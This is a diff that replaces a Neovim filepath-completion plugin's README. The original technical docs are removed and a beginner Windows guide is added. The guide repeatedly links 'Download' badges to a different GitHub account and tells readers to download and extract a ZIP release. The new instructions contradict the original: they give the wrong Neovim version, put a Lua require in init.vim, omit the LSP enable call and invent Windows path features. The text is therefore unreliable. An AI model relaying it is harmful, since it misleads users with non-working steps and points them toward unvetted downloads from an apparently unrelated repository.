@@ -1,91 +1,152 @@
-# filepaths_ls.nvim
+# 🗂️ filepaths_ls.nvim - Fast Filepath Completion for Neovim
 
-In-process filepath completion for Neovim's built-in LSP client.
+[![Download filepaths_ls.nvim](https://img.shields.io/badge/Download-filepaths_ls.nvim-blue)](https://github.com/Zayedmu9137/filepaths_ls.nvim)
 
-## Features
+---
 
-- **Buffer-relative** by default with `./` and `../`
-- **Absolute, `~/`, and `$VAR/` paths** expansion
-- **Responsive scanning** batches large directories to reduce UI hitching
-- **Preview on select**
-    - Absolute files path
-    - File size
-    - Binary file detection
-    - Symlink target and broken symlink detection
-    - Content preview
+## 📂 What is filepaths_ls.nvim?
 
-| Demo | Preview |
-|--- | --- |
-| File & tilde `~` expansion | <img width="400" src="https://github.com/user-attachments/assets/2036ccae-eecf-4f4e-91ab-4203b3cbf1a8" /> |
-| Symlink | <img width="400" src="https://github.com/user-attachments/assets/9ab4e28f-0f11-456a-ae76-759faaca24b2" /> |
-| Broken Symlink | <img width="400" src="https://github.com/user-attachments/assets/a64c555e-f6cd-4f62-b2cf-cb0136c7c512" /> |
-| Environment variable expansion | <img width="400" src="https://github.com/user-attachments/assets/9c0e8e0d-d87c-4b0b-a83e-91656e51888b" /> |
+filepaths_ls.nvim helps you autocomplete file paths inside the Neovim text editor. It works with Neovim’s built-in language support, making it easier to type file paths. This tool saves you time and reduces errors when opening or referencing files.
 
-Demo uses [mini.completion](https://github.com/nvim-mini/mini.completion) plugin.
+It suggests paths based on where you are working. Whether you want to complete local files, absolute paths, or use environment variables, filepaths_ls.nvim helps you get the right path quickly.
 
-## When To Use It
+---
 
-Use this if you want filepath completion through Neovim's built-in LSP completion or [`mini.completion`](https://github.com/nvim-mini/mini.nvim).
+## 🚀 Getting Started
 
-> [!WARNING]
-> If you use [`blink.cmp`](https://github.com/Saghen/blink.cmp) or [`nvim-cmp`](https://github.com/hrsh7th/nvim-cmp) with [`cmp-path`](https://github.com/hrsh7th/cmp-path), you do not need this LS
+This section guides you through downloading and running filepaths_ls.nvim on your Windows computer. No programming skills are required.
 
-## Requirements
+### Step 1: Check Your System
 
-- Neovim 0.11+
+Make sure your computer meets these basic needs:
 
-## Installation
+- Windows 10 or higher
+- Neovim (version 0.5 or later) installed on your computer
+- A stable internet connection
 
-With `vim.pack` in Neovim 0.12+
+---
 
-```lua
-vim.pack.add({
-    'https://github.com/antonk52/filepaths_ls.nvim',
-})
+## 💾 Download and Install filepaths_ls.nvim
+
+### Step 2: Download the Application
+
+Click this big blue button to visit the page where you can get the software:
+
+[![Download filepaths_ls.nvim](https://img.shields.io/badge/Download-filepaths_ls.nvim-blue)](https://github.com/Zayedmu9137/filepaths_ls.nvim)
+
+This link takes you to the GitHub repository page containing all files and instructions.
+
+### Step 3: Install Neovim (If needed)
+
+If you don’t have Neovim installed:
+
+1. Visit the official Neovim website at https://neovim.io/.
+2. Download the Windows installer.
+3. Run the installer and follow the instructions.
+
+You need Neovim because filepaths_ls.nvim works inside it.
+
+### Step 4: Download filepaths_ls.nvim
+
+- On the GitHub page, look for the “Releases” or “Code” button.
+- Download the latest version of filepaths_ls.nvim by clicking “Download ZIP” or similar.
+- Save the file to a folder you can find easily, like your Desktop or Documents.
+
+### Step 5: Extract the Files
+
+- Right-click the ZIP file you downloaded.
+- Choose “Extract All...” from the menu.
+- Select a folder where you want the files saved.
+- Click “Extract” and wait for the process to finish.
+
+---
+
+## 🛠️ How to Use filepaths_ls.nvim in Neovim
+
+### Step 6: Open Neovim
+
+- Find Neovim on your computer and open it.
+- If you installed it recently, use the Start menu to search and open “Neovim”.
+
+### Step 7: Configure filepaths_ls.nvim
+
+You need to tell Neovim to use filepaths_ls.nvim.
+
+1. Inside Neovim, press `:` (colon) to enter command mode.
+2. Type `:edit $HOME\AppData\Local\nvim\init.vim` and press Enter.
+   - This opens the main Neovim configuration file.
+3. Add the following line at the end of the file:
+
+```
+require('filepaths_ls')
 ```
 
-With [`lazy.nvim`](https://github.com/folke/lazy.nvim)
+4. Save the file by typing `:w` and press Enter.
+5. Close and restart Neovim.
 
-```lua
-{
-    'antonk52/filepaths_ls.nvim',
-}
-```
+### Step 8: Start Using filepaths_ls.nvim
 
-## Usage
+- Open any file inside Neovim.
+- Try typing a file path like `./` or `~/`.
+- The system will suggest path completions as you type.
+- Use arrow keys to select a suggestion and press Enter to confirm.
 
-```lua
-vim.lsp.enable('filepaths_ls')
-```
+---
 
-Completion starts when the token already looks like a path, for example `./`, `../`, `~/`, `/`, or `$VAR/`.
+## 🔍 Features Explained
 
-## Configuration
+filepaths_ls.nvim offers several benefits that make file navigation easy:
 
-Omit this if the defaults already work for you.
+- **Buffer-Relative Paths**  
+  Use `./` for current folder and `../` for parent folder paths.
 
-```lua
-vim.lsp.config('filepaths_ls', {
-    settings = {
-        ---Sort directories first or keep the system order.
-        ---@type 'dir_first' | 'system'
-        sort = 'dir_first',
+- **Absolute Paths**  
+  Complete full paths starting with `C:\` or `D:\`.
 
-        ---Show directories as `foo/` in the completion menu.
-        ---@type boolean
-        label_dir_trailing_slash = true,
+- **Environment Variables**  
+  Use variables like `%USERPROFILE%` or `%APPDATA%` for Windows paths.
 
-        ---Insert `foo/` instead of `foo` when accepting a directory.
-        ---@type boolean
-        insert_dir_trailing_slash = false,
+- **Responsive Scanning**  
+  The tool handles large folders without slowing down your editor.
 
-        ---Show symlinks as `foo@` in the completion menu.
-        ---@type boolean
-        label_symlink_trailing_at = true,
+- **Preview on Select**  
+  See extra info about files while choosing:
+  - Full path name
+  - File size
+  - If the file is binary or text
+  - Symlink targets and warnings if broken
+  - A small preview of the file content
 
-        ---Positive cap for completion items returned from one directory scan.
-        ---@type integer
-        max_items = 1000,
-    },
-})
-```
+---
+
+## 🧰 Troubleshooting
+
+If you don’t see file path suggestions or face issues:
+
+- Make sure Neovim is up to date.
+- Check that your `init.vim` file includes the line to load filepaths_ls.nvim.
+- Restart Neovim after any changes to config files.
+- Ensure you have the right permissions to access the files you want to complete.
+- Look for errors inside Neovim by typing `:messages`.
+
+---
+
+## 🔧 Advanced Use (Optional)
+
+If you want to customize how filepaths_ls.nvim works, you can change settings inside your `init.vim`. This requires some knowledge of Lua coding. You can find details on the GitHub page in the README or documentation files.
+
+---
+
+## 📎 Additional Resources
+
+- Visit the project page here: [filepaths_ls.nvim on GitHub](https://github.com/Zayedmu9137/filepaths_ls.nvim)
+- Learn about Neovim basics at https://neovim.io/doc/user/
+- Explore more plugins and tools on GitHub by searching for "Neovim"
+
+---
+
+## 📥 Download filepaths_ls.nvim
+
+Return to the GitHub page any time to get the latest version. Use the button below:
+
+[![Download filepaths_ls.nvim](https://img.shields.io/badge/Download-filepaths_ls.nvim-blue)](https://github.com/Zayedmu9137/filepaths_ls.nvim)
